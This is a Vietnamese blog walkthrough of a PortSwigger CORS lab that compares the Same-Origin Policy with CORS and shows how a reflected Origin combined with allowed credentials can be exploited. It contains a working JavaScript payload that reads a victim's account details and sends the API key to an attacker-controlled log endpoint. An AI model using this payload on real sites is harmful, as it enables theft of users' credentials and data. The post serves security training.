---
title: "[PortSwigger Lab] - Cross Origin Resource Sharing (CORS)"
description: Solution of Cross Origin Resource Sharing (CORS) on PortSwigger Lab
date: 2025-06-07 20:46:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, cors]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-07-portswigger-lab-cors/cors.png
    alt: Cross Origin Resource Sharing (CORS)
---

## Introduction
**Cross-Origin Resource Sharing (CORS)** là một cơ chế bảo mật của trình duyệt, cho phép hoặc từ chối các yêu cầu từ một origin khác với origin của trang web hiện tại. Nó mở rộng **Same-Origin Policy (SOP)** — chính sách chỉ cho phép các tài nguyên được truy cập nếu chúng đến từ cùng một origin (gồm `scheme`, `hostname` và `port`).

| **Tiêu chí**                       | **Same-Origin Policy (SOP)**                                                      | **Cross-Origin Resource Sharing (CORS)**                                                     |
| ---------------------------------- | --------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| **Mục tiêu chính**                 | Ngăn chặn website này truy cập dữ liệu riêng tư của website khác                  | Cho phép truy cập có kiểm soát đến tài nguyên từ origin khác                                 |
| **Phạm vi áp dụng**                | Trình duyệt web (JavaScript không được truy cập tài nguyên khác origin)           | Trình duyệt web (mở rộng khả năng truy cập cross-origin có kiểm soát)                        |
| **Thành phần xác định origin**     | Scheme (protocol), domain, port                                                   | Cũng dùng Origin (scheme + domain + port) để xác định ai được phép truy cập                  |
| **Hành vi mặc định**               | **Chặn** truy cập giữa các origin khác nhau                                       | **Không cho phép** nếu không có header CORS hợp lệ từ phía server                            |
| **Tác động đến JS**                | Không cho phép JavaScript đọc dữ liệu từ các trang khác origin                    | Cho phép nếu server gửi đúng header `Access-Control-Allow-Origin`                            |
| **Cho phép tải tài nguyên không?** | Có thể tải hình ảnh, script, font… từ domain khác (nhưng không được đọc nội dung) | Có thể cho phép đọc nội dung, gửi cookie nếu server đồng ý bằng header                       |
| **Kiểm soát từ phía nào?**         | Trình duyệt kiểm soát                                                             | Trình duyệt **và** server phối hợp (server phải trả header phù hợp)                          |
| **Có hỗ trợ cookie không?**        | Cookie được gửi theo origin, nhưng JS không thể đọc cookie của origin khác        | Có, nếu server trả `Access-Control-Allow-Credentials: true` và không dùng `*`                |
| **Tính mở rộng**                   | Không mở rộng – giới hạn nghiêm ngặt giữa các origin                              | Rất linh hoạt, nhưng dễ **cấu hình sai dẫn đến lỗ hổng bảo mật**                             |
| **Lỗi phổ biến**                   | Không có (vì chặn mặc định)                                                       | Phản hồi `Access-Control-Allow-Origin` với bất kỳ Origin (reflect origin) → **lỗ hổng CORS** |
| **Cách dùng phổ biến**             | Tự động, không cần cấu hình                                                       | Dùng khi website cần chia sẻ tài nguyên qua API hoặc frontend từ domain khác                 |

## Solve CORS Lab

| Thành phần                         | Giá trị phản ánh lỗi                              |
| ---------------------------------- | ------------------------------------------------- |
| `Access-Control-Allow-Origin`      | Phản chiếu lại bất kỳ `Origin` gửi lên            |
| `Access-Control-Allow-Credentials` | `true` (cho phép cookie được gửi đi và dùng)      |

### Lab: CORS vulnerability with basic origin reflection
#### Analysis
- Login bằng tài khoản được cấp 
- Mở **Proxy** > **HTTP History** của **Burp**
- Tìm request **AJAX** gửi đến `/accountDetails`, thấy response có header `Access-Control-Allow-Credentials: true` => Gợi ý rằng **server** có hỗ trợ **CORS**.
- Thêm header `Origin: https://evil.com` trong request để test server có **reflect Origin** không
- Server phản hồi `Access-Control-Allow-Origin: https://evil.com` => **reflect Origin**

=> Như này tất cả các request sẽ được trình duyệt chấp nhận 

#### Exploit
- Tạo script gửi đến victim
```html
    <script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('GET', 'https://YOUR-LAB-ID.web-security-academy.net/accountDetails', true);
        req.withCredentials = true;  // Cho phép gửi cookie 
        req.send();

        function reqListener() {
            // Gửi kết quả (API key) về attacker (qua đường dẫn /log)
            location = '/log?key=' + this.responseText;
        };
    </script>
```
- Khi victim truy cập vào trang web của attacker, script trên được thực thi, theo hành vi mặc định, **browser** thêm **header Origin: evil.com** vào request, trong trường hợp này:
    - Server phản hồi lại `Access-Control-Allow-Origin: evil.com` và `Access-Control-Allow-Credentials: true`
    - Vì vậy request thành công khi server chấp nhận **Origin** và **cookie** từ **browser**
- Lấy `apikey` và submit

### 

---
Goodluck! 🍀🍀🍀